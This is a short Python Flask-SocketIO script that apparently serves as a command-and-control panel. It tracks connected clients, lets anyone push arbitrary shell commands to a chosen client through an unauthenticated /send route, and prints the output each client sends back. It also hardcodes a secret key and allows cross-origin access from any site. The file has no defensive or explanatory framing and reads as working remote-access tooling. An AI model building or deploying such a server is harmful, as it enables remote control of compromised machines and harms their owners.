from gevent import monkey
monkey.patch_all()

from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit, send


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins='*')

clients = {}

@app.route('/')
def index():
    return render_template('index.html', clients=clients)

@socketio.on('connect')
def handle_connect(auth):  # ✅ FIXED
    sid = request.sid
    clients[sid] = {'id': sid}
    print(f"[+] Client connected: {sid}")
    emit('welcome', {'msg': f'You are connected as {sid}'})
    update_clients()

@socketio.on('disconnect')
def handle_disconnect():  # ✅ FIXED
    sid = request.sid
    clients.pop(sid, None)
    print(f"[-] Client disconnected: {sid}")
    update_clients()

@socketio.on('client_output')
def handle_client_output(data):
    print(f"[⇧] Output from {request.sid}:\n{data['output']}")

@app.route('/send/<client_id>', methods=['POST'])
def send_command(client_id):
    cmd = request.form.get('cmd')
    socketio.emit('command', {'cmd': cmd}, room=client_id)
    return f"Sent command to {client_id}. <a href='/'>Go back</a>"

def update_clients():
    socketio.emit('client_list', list(clients.keys()), to=None)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=10000)
